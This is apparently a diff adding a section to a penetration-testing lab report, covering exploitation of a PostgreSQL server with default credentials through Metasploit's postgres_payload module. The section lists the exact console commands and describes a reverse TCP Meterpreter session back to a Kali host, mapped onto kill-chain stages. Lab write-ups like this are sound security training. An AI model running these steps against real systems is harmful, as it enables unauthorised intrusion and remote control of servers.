@@ -192,3 +192,33 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran sysinfo and getuid, confirming access under the tomcat55 service account.
 - **Outcome / Impact:** Achieved code execution and a Meterpreter session under the Tomcat service account (not root), demonstrating that weak application-level credentials can lead to compromise even without a memory-corruption or backdoor-style bug — though with more limited privileges than the previous four exploits.
+
+
+
+---
+
+## Exploit 6: PostgreSQL Default Credentials Payload Execution
+
+- **Service / Port:** PostgreSQL / 5432
+- **Vulnerability:** The PostgreSQL server was left with the default credentials (postgres:postgres), and PostgreSQL supports loading and executing shared library functions server-side, allowing an authenticated attacker to upload and execute a malicious shared object to gain code execution.
+- **Tool Used:** Metasploit — exploit/linux/postgres/postgres_payload
+- **Why This Tool:** Recon identified PostgreSQL 8.3.0-8.3.7 on port 5432. This module is purpose-built for Linux PostgreSQL installations and defaults to the well-known postgres:postgres credential pair, making it a fast and reliable way to test for and exploit this common misconfiguration rather than manually crafting a shared-library payload and loading it via raw SQL commands.
+- **Steps:**
+  1. `background`
+  2. `back`
+  3. `search postgres`
+  4. `use exploit/linux/postgres/postgres_payload`
+  5. `set RHOSTS 192.168.100.204`
+  6. `set LHOST 192.168.100.253`
+  7. `run`
+  8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
+- **Evidence:** evidence/exploit6.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified PostgreSQL 8.3.0-8.3.7 running on port 5432.
+  - **Weaponization:** Selecting the postgres_payload module, which defaults to the common postgres:postgres credentials, paired weak authentication with a Meterpreter payload.
+  - **Delivery:** The module authenticated to the database and uploaded a malicious shared object to the server's temp directory.
+  - **Exploitation:** PostgreSQL loaded and executed the uploaded shared object as a server-side function.
+  - **Installation:** The Meterpreter payload executed, establishing a foothold under the postgres service account.
+  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran sysinfo and getuid, confirming access as the postgres user.
+- **Outcome / Impact:** Achieved code execution and a Meterpreter session under the postgres service account via default database credentials, demonstrating that weak default credentials on a database service can lead directly to remote code execution, not just data exposure.
